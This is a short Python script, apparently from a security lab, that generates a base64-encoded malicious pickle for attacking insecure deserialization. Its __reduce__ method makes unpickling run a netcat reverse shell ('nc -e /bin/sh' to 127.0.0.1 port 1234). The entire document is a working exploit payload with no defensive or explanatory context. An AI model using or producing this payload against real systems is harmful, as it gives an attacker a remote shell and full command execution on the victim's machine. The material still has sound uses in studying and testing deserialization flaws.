import pickle, base64,os

class skf(object):
  def __reduce__(self):
    return (os.system,("nc -nv 127.0.0.1 1234 -e /bin/sh",))

a = skf()
ser = pickle.dumps(a)
print (base64.b64encode(ser))
